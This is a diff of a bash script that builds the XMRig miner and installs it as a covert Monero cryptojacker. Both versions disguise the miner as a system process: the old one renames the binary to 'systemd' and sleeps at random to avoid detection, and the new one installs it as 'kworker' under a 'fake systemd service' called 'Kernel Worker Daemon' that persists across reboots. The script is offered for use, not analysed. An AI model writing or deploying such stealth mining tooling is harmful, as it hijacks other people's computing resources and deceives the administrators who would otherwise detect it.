@@ -1,31 +1,50 @@
 #!/bin/bash
 
-### CONFIGURATION ###
-WALLET="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"
-POOL="pool.supportxmr.com:443"
-THREADS=12
-ALIAS_NAME="systemd"  # disguises the process
-WORKER_ID="node-$(hostname)"
+echo "🔧 Setting up Monero stealth miner..."
 
-### INSTALL DEPENDENCIES ###
-install_xmrig() {
-    sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-    git clone https://github.com/xmrig/xmrig.git
-    mkdir xmrig/build && cd xmrig/build
-    cmake .. && make -j$(nproc)
-    cd ../..
-    mv xmrig/build/xmrig ./$ALIAS_NAME  # disguise the binary
-}
+# 1. Update system and install dependencies
+sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen
 
-### SETUP ###
-[ ! -f "./$ALIAS_NAME" ] && install_xmrig
+# 2. Clone XMRig
+git clone https://github.com/xmrig/xmrig.git
+cd xmrig || exit
 
-### RANDOM SLEEP TO AVOID PATTERNS ###
-sleep_time=$((RANDOM % 300))  # up to 5 minutes
-echo "[*] Sleeping for $sleep_time seconds to avoid detection..."
-sleep $sleep_time
+# 3. Build XMRig
+mkdir build && cd build
+cmake ..
+make -j$(nproc)
 
-### LAUNCH MINER IN BACKGROUND ###
-echo "[*] Starting miner..."
-nohup ./$ALIAS_NAME -o $POOL -u $WALLET -k -p $WORKER_ID --tls -t $THREADS --donate-level 1 > /dev/null 2>&1 &
-echo "[+] Mining started with alias '$ALIAS_NAME'. Check running processes."
+# 4. Ask for wallet address
+read -p "🔑 Enter your Monero wallet address: " WALLET
+
+# 5. Move miner and rename it
+sudo mv ./xmrig /usr/local/bin/kworker
+sudo chmod +x /usr/local/bin/kworker
+
+# 6. Create fake systemd service
+echo "📦 Creating fake systemd service..."
+
+sudo tee /etc/systemd/system/system-kd.service > /dev/null <<EOF
+[Unit]
+Description=Kernel Worker Daemon
+After=network.target
+
+[Service]
+ExecStart=/usr/local/bin/kworker -o pool.supportxmr.com:443 -u $WALLET -k --tls
+Restart=always
+Nice=10
+CPUWeight=10
+IOWeight=10
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# 7. Enable and start the service
+sudo systemctl daemon-reload
+sudo systemctl enable system-kd
+sudo systemctl start system-kd
+
+echo "✅ Monero miner running stealthily as 'system-kd.service'."
+echo "🔍 Check: sudo systemctl status system-kd"
+echo "🛑 Stop:  sudo systemctl stop system-kd"
